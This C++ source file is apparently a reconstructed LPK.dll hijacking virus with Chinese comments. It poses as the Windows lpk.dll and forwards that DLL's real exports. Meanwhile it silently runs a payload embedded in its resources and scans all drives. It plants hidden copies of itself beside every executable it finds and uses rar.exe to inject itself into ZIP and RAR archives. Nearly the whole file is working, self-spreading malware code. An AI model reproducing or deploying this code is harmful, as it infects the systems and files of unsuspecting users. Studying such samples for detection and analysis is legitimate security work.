// Lpk.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <windows.h>
#include <Shlobj.h>
#include <Shellapi.h>
#include "resource.h"
#include <iostream>
#include <Shlwapi.h>

#pragma comment(lib,"Shlwapi.lib")
#pragma comment(lib,"Shell32.lib")

#pragma comment(linker, "/SECTION:.text,REW" ) //设PE节：.text,可读可执行

typedef void  (__stdcall  * MYAPI)();

MYAPI pLpkInitialize;
MYAPI pLpkTabbedTextOut;
MYAPI pLpkDllInitialize;
MYAPI pLpkDrawTextEx;
MYAPI pLpkEditControl;
MYAPI pLpkExtTextOut;
MYAPI pLpkGetCharacterPlacement;
MYAPI pLpkGetTextExtentExPoint;
MYAPI pLpkPSMTextOut;
MYAPI pLpkUseGDIWidthCache;
MYAPI pftsWordBreak;

__declspec(naked) void LpkInitialize(){
	//	MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
	__asm jmp dword ptr [pLpkInitialize]
}
__declspec(naked) void LpkTabbedTextOut(){
	//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
	__asm jmp dword ptr [pLpkTabbedTextOut]
}
__declspec(naked) void LpkDllInitialize(){
	//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
	__asm jmp dword ptr [pLpkDllInitialize]
}
__declspec(naked) void LpkDrawTextEx(){
	//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
	__asm jmp dword ptr [pLpkDrawTextEx]
}
__declspec(naked) void LpkExtTextOut(){
	//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
	__asm jmp dword ptr [pLpkExtTextOut]
}
__declspec(naked) void LpkGetCharacterPlacement(){
	//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
	__asm jmp dword ptr [pLpkGetCharacterPlacement]
}
__declspec(naked) void LpkGetTextExtentExPoint(){
	//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
	__asm jmp dword ptr [pLpkGetTextExtentExPoint]
}
__declspec(naked) void LpkPSMTextOut(){
	//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
	__asm jmp dword ptr [pLpkPSMTextOut]
}
__declspec(naked) void LpkUseGDIWidthCache(){
	//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
	__asm jmp dword ptr [pLpkUseGDIWidthCache]
}
__declspec(naked) void ftsWordBreak(){
	//		MessageBox(NULL,"LPK劫持","LPK劫持",MB_OK);
	__asm jmp dword ptr [pftsWordBreak]
}
BYTE LpkEditControl[0x40] = {0};

HANDLE g_hmodule;
WCHAR ExistingFileName[100];
char Name[100];
HANDLE hThread;
HANDLE hHandle_Event;
#define LOBYTE BYTE
#define _DWORD DWORD
void  hook_sub_10001022(void)
{
	char cDllPath[MAX_PATH]={0};
	GetSystemDirectoryA((LPSTR)cDllPath,MAX_PATH);
	strcat(cDllPath,"\\lpk.dll");
	HMODULE hDll = LoadLibraryA(cDllPath);

	pLpkInitialize = (MYAPI) GetProcAddress(hDll,"LpkInitialize");
	pLpkTabbedTextOut = (MYAPI) GetProcAddress(hDll,"LpkTabbedTextOut");
	pLpkDllInitialize = (MYAPI) GetProcAddress(hDll,"LpkDllInitialize");
	pLpkDrawTextEx = (MYAPI) GetProcAddress(hDll,"LpkDrawTextEx");
	pLpkExtTextOut = (MYAPI) GetProcAddress(hDll,"LpkExtTextOut");
	pLpkGetCharacterPlacement = (MYAPI) GetProcAddress(hDll,"LpkGetCharacterPlacement");
	pLpkEditControl = (MYAPI) GetProcAddress(hDll,"LpkEditControl");
	pLpkGetTextExtentExPoint = (MYAPI) GetProcAddress(hDll,"LpkGetTextExtentExPoint");
	pLpkPSMTextOut = (MYAPI) GetProcAddress(hDll,"LpkPSMTextOut");
	pLpkUseGDIWidthCache = (MYAPI) GetProcAddress(hDll,"LpkUseGDIWidthCache");
	pftsWordBreak = (MYAPI) GetProcAddress(hDll,"ftsWordBreak");
	//将原始DLL中pLpkEditControl所指向数据拷贝到我们的DLL中LpkEditControl所指向的内存。
	CopyMemory((LPVOID)( (DWORD)LpkEditControl ),(PVOID)( (DWORD)pLpkEditControl ),56);

}

bool hook_sub_100010D3()
{
	WCHAR LibFileName; 

	GetSystemDirectoryW(&LibFileName, 0x104u);
	lstrcatW(&LibFileName, L"\\lpk");
	HANDLE hModule = LoadLibraryW(&LibFileName);
	if ( hModule )
		hook_sub_10001022();
	return hModule != 0;

}

signed int __cdecl get_res_name()
{
	signed int v0; // ebx@1
	HRSRC HRSRC_hrsrc; // eax@1
	HRSRC HRSRC_hrsrc_temp; // esi@1
	DWORD size; // edi@2
	HGLOBAL HGLOBAL_; // eax@2
	const CHAR *str_name; // eax@4

	v0 = 0;
	HRSRC_hrsrc = FindResourceW((HMODULE)g_hmodule, (LPCWSTR)0x65, (LPCWSTR)0xA);;//aspnet_statesjrq
	HRSRC_hrsrc_temp = HRSRC_hrsrc;
	if ( HRSRC_hrsrc )
	{
		size = SizeofResource((HMODULE)g_hmodule, HRSRC_hrsrc);
		HGLOBAL_ = LoadResource((HMODULE)g_hmodule, HRSRC_hrsrc_temp);
		if ( HGLOBAL_ )
		{
			if ( size )
			{
				str_name = (const CHAR *)LockResource(HGLOBAL_);
				if ( str_name )
				{
					lstrcpynA(Name, str_name, 32);
					v0 = 1;
				}
			}
		}
	}
	return v0;
}
bool __cdecl Check_FileNameis_hrl_TMP()
{
	LPWSTR FileName; // eax@1
	const WCHAR *file_extension; // eax@4
	WCHAR pszPath[100]; // [sp+0h] [bp-20Ch]@1
	unsigned int v4; // [sp+208h] [bp-4h]@1
	int v5; // [sp+20Ch] [bp+0h]@1


	GetModuleFileNameW(0, pszPath, 0x104u);
	FileName = PathFindFileNameW(pszPath);
	return *FileName == 'h'
		&& FileName[1] == 'r'
		&& FileName[2] == 'l'
		&& (file_extension = PathFindExtensionW(FileName)) != 0
		&& !lstrcmpiW(file_extension, L".TMP");
}
int __cdecl CreateMutex_signal()
{
	HANDLE HANDLE_mutex; // edi@1
	int result; // eax@2
	int v2; // esi@3

	HANDLE_mutex = CreateMutexA(0, 0, Name);
	if ( HANDLE_mutex )
	{
		v2 = -(GetLastError() != '?');
		CloseHandle(HANDLE_mutex);
		result = v2 + 1;
	} 
	else
	{
		result = 1;
	}
	return result;
}
int __cdecl CreateTempFileToRun_()
{
	HRSRC v0_hrsrc; // eax@1
	HRSRC v1; // edi@1
	HGLOBAL HGLOBAL_; // eax@2
	HANDLE h_file; // edi@5
	struct _STARTUPINFOW StartupInfo; // [sp+8h] [bp-270h]@7
	struct _PROCESS_INFORMATION ProcessInformation; // [sp+4Ch] [bp-22Ch]@7
	DWORD NumberOfBytesWritten; // [sp+5Ch] [bp-21Ch]@6
	LPCVOID lpBuffer; // [sp+60h] [bp-218h]@4
	DWORD nNumberOfBytesToWrite; // [sp+64h] [bp-214h]@2
	int v10; // [sp+68h] [bp-210h]@1
	WCHAR PathName; // [sp+6Ch] [bp-20Ch]@5
	unsigned int v12; // [sp+274h] [bp-4h]@1
	int v13; // [sp+278h] [bp+0h]@1

	v10 = 0;
	v0_hrsrc = FindResourceW((HMODULE)g_hmodule, (LPCWSTR)0x66, (LPCWSTR)0xA);

	v1 = v0_hrsrc;
	if ( v0_hrsrc )
	{
		nNumberOfBytesToWrite = SizeofResource((HMODULE)g_hmodule, v0_hrsrc);
		HGLOBAL_ = LoadResource((HMODULE)g_hmodule, v1);
		if ( HGLOBAL_ )
		{
			if ( nNumberOfBytesToWrite )
			{
				lpBuffer = LockResource(HGLOBAL_);
				if ( lpBuffer )
				{
					GetTempPathW(0x104u, &PathName);
					GetTempFileNameW(&PathName, L"hrl", 0, &PathName);
					h_file = CreateFileW(&PathName, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);// GENERIC_WRITE  FILE_SHARE_READ CREATE_ALWAYS
					if ( h_file != (HANDLE)-1 )
					{
						NumberOfBytesWritten = 0;
						v10 = WriteFile(h_file, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);// 生成文件
						CloseHandle(h_file);
						if ( v10 == 1 )
						{
							RtlZeroMemory(&StartupInfo, 0, 0x44u);
							StartupInfo.wShowWindow = 0;
							StartupInfo.cb = 68;
							StartupInfo.dwFlags = 1;
							v10 = CreateProcessW(0, &PathName, 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInformation);
							if ( v10 == 1 )
							{
								CloseHandle(ProcessInformation.hThread);
								CloseHandle(ProcessInformation.hProcess);
							}
						}
					}
				}
			}
		}
	}
	return v10;
}
bool __cdecl Check_SelfNameis_lpk_dll()
{
	const WCHAR *v0; // eax@1
	WCHAR pszPath; // [sp+0h] [bp-20Ch]@1


	GetModuleFileNameW((HMODULE)g_hmodule, &pszPath, 0x104u);
	v0 = PathFindFileNameW(&pszPath);
	return lstrcmpiW(v0, L"lpk.dll") != 0;
}
DWORD __cdecl hide_CreateProcess(LPWSTR lpCommandLine, DWORD dwMilliseconds)
{
	DWORD result; // eax@2
	struct _STARTUPINFOW StartupInfo; // [sp+4h] [bp-58h]@1
	struct _PROCESS_INFORMATION ProcessInformation; // [sp+48h] [bp-14h]@1
	DWORD ExitCode; // [sp+58h] [bp-4h]@5

	RtlZeroMemory(&StartupInfo, 0, 0x44u);
	StartupInfo.wShowWindow = 0;
	StartupInfo.cb = 68;
	StartupInfo.dwFlags = 1;
	if ( CreateProcessW(0, lpCommandLine, 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInformation) )
	{
		if ( WaitForSingleObject(ProcessInformation.hProcess, dwMilliseconds) )
			TerminateProcess(ProcessInformation.hProcess, 0x5B4u);
		ExitCode = 713;
		GetExitCodeProcess(ProcessInformation.hProcess, &ExitCode);
		CloseHandle(ProcessInformation.hThread);
		CloseHandle(ProcessInformation.hProcess);
		result = ExitCode;
	}
	else
	{
		result = GetLastError();
	}
	return result;
}
signed int __stdcall StartAddress_add_lpk(LPCWSTR lpString2);
DWORD __cdecl add_lpk_to_zip_rar_sub_100014B5(int a1_c_xx_rar_zip)
{
	DWORD result; // eax@1
	wchar_t v2[2]; // eax@3
	UINT v3_currentthreadid; // eax@6
	DWORD v4; // [sp+4h] [bp-828h]@1
	WCHAR CommandLine; // [sp+8h] [bp-824h]@6
	WCHAR PathName; // [sp+418h] [bp-414h]@6
	WCHAR FileName; // [sp+620h] [bp-20Ch]@1
	WCHAR String2; // [sp+622h] [bp-20Ah]@3

	v4 = 520;
	result = SHRegGetValueW(HKEY_CLASSES_ROOT, L"WinRAR\\shell\\open\\command", 0, 2, 0, &FileName, &v4);// HKEY_CLASSES_ROOT   SRRF_RT_REG_SZ
	if ( !result )                                // Type REG_SZ. REG_EXPAND_SZ types are automatically converted to REG_SZ unless the SRRF_NOEXPAND flag is specified.
	{                                             // "C:\Program Files\WinRAR\WinRAR.exe" "%1"
		if ( FileName == '"' )
		{
			lstrcpyW(&FileName, &String2);
			v2[0] = '"';
		}
		else
		{
			v2[0] = ' ';
		}

		if ( StrStrIW(&FileName, v2) )
		{
			result = 0;
			PathRemoveFileSpecW(&FileName);
			PathAppendW(&FileName, L"rar.exe");       // C:\Program Files\WinRAR
			result = GetFileAttributesW(&FileName);
			if ( result != -1 )
			{
				PathGetShortPath(&FileName);            // This function is available through Windows XP Service Pack 2 (SP2) and Windows Server 2003. It might be altered or unavailable in subsequent versions of Windows.
				GetTempPathW(0x104u, &PathName);
				v3_currentthreadid = GetCurrentThreadId();
				GetTempFileNameW(&PathName, L"IRAR", v3_currentthreadid, &PathName);// temp_file_create
				wsprintfW(
					&CommandLine,
					L"cmd /c %s vb \"%s\" lpk.dll|find /i \"lpk.dll\"",// 查找lpk.dll
					&FileName,                            // cmd /c C:\PROGRA~1\WinRAR\rar.exe vb "D:\a.zip" lpk.dll|find /i "lpk.dll"
					a1_c_xx_rar_zip,
					&PathName);
				result = hide_CreateProcess(&CommandLine, 0xEA60u);
				if ( result )
				{
					wsprintfW(&CommandLine, L"\"%s\" x \"%s\" *.exe \"%s\\\"", &FileName, a1_c_xx_rar_zip, &PathName);
					hide_CreateProcess(&CommandLine, 0x1D4C0u);// C:\PROGRA~1\WinRAR\rar.exe x D:\a.zip *.exe "C:\Temp\xxx.tmp"
					StartAddress_add_lpk(&PathName);      // 解压a.zip 所有exe  解压到tempPath

					wsprintfW(
						&CommandLine,
						L"\"%s\" a -r -ep1\"%s\" \"%s\" \"%s\\lpk.dll\"",
						&FileName,
						&PathName,
						a1_c_xx_rar_zip,
						&PathName);
					hide_CreateProcess(&CommandLine, 0x3A980u);
					wsprintfW(&CommandLine, L"cmd /c RD /s /q \"%s\"", &PathName);// "C:\PROGRA~1\WinRAR\rar.exe" a -r -ep1"C:\Temp\xxx.tmp" "c:\xxx.zip" C:\Temp\xxx.tmp\lpk.dll\

					result = hide_CreateProcess(&CommandLine, 0xEA60u);// 压缩进 lpk.dll
				}
			}
		}
	}
	return result;
}


signed int __stdcall StartAddress_add_lpk(LPCWSTR lpString2)
{
	const WCHAR *file_Extension_; // eax@17
	const WCHAR *file_Extension; // [sp+8h] [bp-670h]@17
	HANDLE hFindFile; // [sp+Ch] [bp-66Ch]@6
	signed int v5; // [sp+10h] [bp-668h]@1
	struct _WIN32_FIND_DATAW FindFileData; // [sp+14h] [bp-664h]@6
	WCHAR String2_DrivePath; // [sp+264h] [bp-414h]@4
	WCHAR FileName; // [sp+46Ch] [bp-20Ch]@6

	v5 = 1;
	if ( WaitForSingleObject(hHandle_Event, 0) != 0x102 )// 用WaitForSingleObject()或WaitForMultipleObjects()来等待其变为有信号.   
		return 0;                                   // WAIT_TIMEOUT
	if ( (unsigned int)lpString2 >= 0x100 )
	{
		lstrcpyW(&String2_DrivePath, lpString2);
	}
	else
	{
		lstrcpyW(&String2_DrivePath, L"A:\\");      // lpString2 = 2
		String2_DrivePath += (unsigned __int16)lpString2;
	}
	lstrcpyW(&FileName, &String2_DrivePath);
	PathAppendW(&String2_DrivePath, L"*");// *
	hFindFile = FindFirstFileW(&String2_DrivePath, &FindFileData);
	if ( hFindFile == (HANDLE)-1 )
		return 1;
	lstrcpyW(&String2_DrivePath, &FileName);
	while ( 1 )
	{
		if ( !lstrcmpiW(FindFileData.cFileName, L".") || !lstrcmpiW(FindFileData.cFileName, L"..") )
			goto LABEL_27;
		if ( FindFileData.dwFileAttributes & 0x10 ) // FILE_ATTRIBUTE_DIRECTORY
			break;
		file_Extension_ = PathFindExtensionW(FindFileData.cFileName);
		file_Extension = file_Extension_;
		if ( file_Extension_ )
		{
			if ( !lstrcmpiW(file_Extension_, L".EXE") )
			{
				lstrcpyW(&FileName, &String2_DrivePath);
				PathAppendW(&FileName, L"lpk.dll");     // c:\lpk.dll
				if ( GetFileAttributesW(&FileName) != -1 )// INVALID_FILE_ATTRIBUTES
					goto LABEL_27;
				CopyFileW(ExistingFileName, &FileName, 1);// copy to c:\lpj.dll
				SetFileAttributesW(&FileName, 7u);      // FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN
			}                                         // 隐藏
			if ( !lstrcmpiW(file_Extension, L".RAR") || !lstrcmpiW(file_Extension, L".ZIP") )
			{
				if ( !FindFileData.nFileSizeHigh && FindFileData.nFileSizeLow < 0x3200000 )
				{
					lstrcpyW(&FileName, &String2_DrivePath);
					PathAppendW(&FileName, FindFileData.cFileName);
					add_lpk_to_zip_rar_sub_100014B5((int)&FileName);
				}
			}
		}
		if ( WaitForSingleObject(hHandle_Event, 0x14u) != 258 )
			goto LABEL_14;
LABEL_27:
		if ( FindNextFileW(hFindFile, &FindFileData) != 1 )
			goto LABEL_15;
	}
	if ( WaitForSingleObject(hHandle_Event, 0x14u) == 258 )
	{
		lstrcpyW(&FileName, &String2_DrivePath);
		PathAppendW(&FileName, FindFileData.cFileName);
		if ( StartAddress_add_lpk(&FileName) )
			goto LABEL_27;
	}
LABEL_14:
	v5 = 0;
LABEL_15:
	FindClose(hFindFile);
	return v5;
}

signed int __cdecl check_time_sub_100016A9()
{
	DWORD i; // eax@1
	DWORD v1; // eax@2
	DWORD num_drive; // [sp+Ch] [bp-8h]@1
	DWORD v4; // [sp+10h] [bp-4h]@1

	num_drive = GetLogicalDrives();
	v4 = GetTickCount();
	for ( i = WaitForSingleObject(hHandle_Event, 0x1388u); ; i = WaitForSingleObject(hHandle_Event, 0x1388u) )
	{
		if ( i != 258 )
			return 0;
		v1 = GetTickCount();
		if ( v1 < v4 )
			break;
		if ( v1 - v4 > 0x6DDD00 || GetLogicalDrives() != num_drive )
			break;
	}
	return 1;
}

DWORD __cdecl ThreadProc()
{
	DWORD v0; // edi@1
	char *v1_StartupInfo; // ebx@2
	HANDLE v2; // eax@5
	HANDLE *v3; // esi@5
	DWORD v4; // esi@11
	DWORD result; // eax@16
	DWORD v6; // esi@18
	HANDLE hObject; // [sp+Ch] [bp-CCh]@5
	int v8; // [sp+6Ch] [bp-6Ch]@2
	int lpParameter; // [sp+70h] [bp-68h]@2
	char v10_StartupInfo; // [sp+74h] [bp-64h]@1

	v0 = 0;
	RtlZeroMemory(&v10_StartupInfo, 0, 0x60u);
	do
	{
		lpParameter = 2;
		v1_StartupInfo = &v10_StartupInfo;
		v8 = 24;
		do
		{
			if ( *(_DWORD *)v1_StartupInfo != 1 )
			{
				if ( (unsigned int)(DriveType(lpParameter) - 2) <= 2 )// c:  DRIVE_FIXED 3-2=1
				{
					v2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress_add_lpk, (LPVOID)lpParameter, 4u, 0);
					v3 = &hObject + v0;
					*v3 = v2;
					if ( v2 )
					{
						if ( SetThreadPriority(v2, -15) != 1 || ResumeThread(*v3) == -1 )
						{
							TerminateThread(*v3, 0);
						}
						else
						{
							++v0;
							*(_DWORD *)v1_StartupInfo = 1;
						}
					}
				}
			}
			++lpParameter;
			v1_StartupInfo += 4;
			--v8;
		}
		while ( v8 );
		v4 = 0;
		if ( v0 && WaitForMultipleObjects(v0, &hObject, 1, 0) != 0x102 )
		{
			RtlZeroMemory(&v10_StartupInfo, 0, 0x60u);
			if ( v0 )
			{
				do
				CloseHandle(*(&hObject + v4++));
				while ( v4 < v0 );
			}
			v0 = 0;
		}
		result = check_time_sub_100016A9();
	}
	while ( result == 1 );
	if ( v0 )
	{
		result = WaitForMultipleObjects(v0, &hObject, 1, 0xFFFFFFFFu);
		v6 = 0;
		if ( v0 )
		{
			do
			result = CloseHandle(*(&hObject + v6++));
			while ( v6 < v0 );
		}
	}
	return result;
}

DWORD __cdecl CreateThread_sub_10001ADC()
{
	DWORD result; // eax@2

	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ThreadProc, 0, 4u, 0);// CREATE_SUSPENDED
	if ( !SetThreadPriority(hThread, -15) || (result = ResumeThread(hThread), result == -1) )
	{                                             // 空闲  THREAD_PRIORITY_IDLE 对于实时优先级类线程在优先级16上运行对于其他优先级类线
		result = TerminateThread(hThread, 0);
		hThread = 0;
	}
	return result;
}

BOOL APIENTRY DllMain( HMODULE hModule, 
	DWORD  ul_reason_for_call, 
	LPVOID lpReserved
	)
{
	int FileNameis_hrl_TMP; // eax@3
	int v4; // eax@6
	BOOL result; // eax@9
	if(ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		//__asm int 3;
		g_hmodule = hModule;
		GetModuleFileNameW(hModule, ExistingFileName, 0x104u);
		DisableThreadLibraryCalls(hModule);
		if ( get_res_name() == 1 )
		{
			LOBYTE(FileNameis_hrl_TMP) = Check_FileNameis_hrl_TMP();
			//__asm int 3;
			if ( !FileNameis_hrl_TMP && !CreateMutex_signal() )
				CreateTempFileToRun_();
			LOBYTE(v4) = Check_SelfNameis_lpk_dll();
			if ( v4 == 1 )
			{
				hHandle_Event = CreateEventW(0, 1, 0, 0);// 一旦该Event被设置为有信号,则它一直会等到ResetEvent()API被调用时才会恢复 为无信号
				if ( hHandle_Event )                    // 用SetEvent()或PulseEvent()来设置它使其有信号
					CreateThread_sub_10001ADC();
			}
		}
		result = hook_sub_100010D3();
	}
	else
	{
		if ( !ul_reason_for_call )
		{
			if ( hHandle_Event )
			{
				SetEvent(hHandle_Event);
				WaitForSingleObject(hThread, 0xFFFFFFFFu);
				CloseHandle(hThread);
				CloseHandle(hHandle_Event);
			}
			if ( hModule )
				FreeLibrary(hModule);
		}
		result = 1;

	}

	return result;
}